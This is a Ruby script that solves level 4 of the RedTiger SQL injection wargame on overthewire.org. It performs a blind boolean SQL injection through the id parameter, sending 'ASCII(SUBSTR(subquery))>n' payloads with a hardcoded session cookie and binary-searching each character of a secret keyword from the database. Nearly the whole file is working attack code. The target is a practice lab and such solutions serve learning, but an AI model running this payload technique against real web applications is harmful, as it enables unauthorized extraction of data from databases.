#!/usr/bin/env ruby
require "net/http"

password = "level4login=there_is_no_bug"

target = URI("https://redtiger.labs.overthewire.org/level4.php")
subquery = "SELECT keyword FROM level4_secret LIMIT 1"
payload = "1 AND ASCII(SUBSTR((#{subquery}),%d,1))>%d"

len = 1

keyword = ""

loop do
    low, high = 0, 127
    guess = low + high >> 1
    greater = false
    loop do
        print guess.to_s(16) + " "
        form = { id: payload % [len, guess] }
        target.query = URI.encode_www_form form
        Net::HTTP.start(target.host, target.port, use_ssl: true) do |http|
            req = Net::HTTP::Get.new target
            req['Cookie'] = password
            res = http.request req
            greater = res.body.include? "0"
        end
        break if low == high
        if greater
            high = guess
        else
            low = guess + 1
        end
        guess = low + high >> 1
    end
    guess += 1 if not greater
    break if guess == 0
    keyword += guess.chr
    len += 1
    puts keyword
end

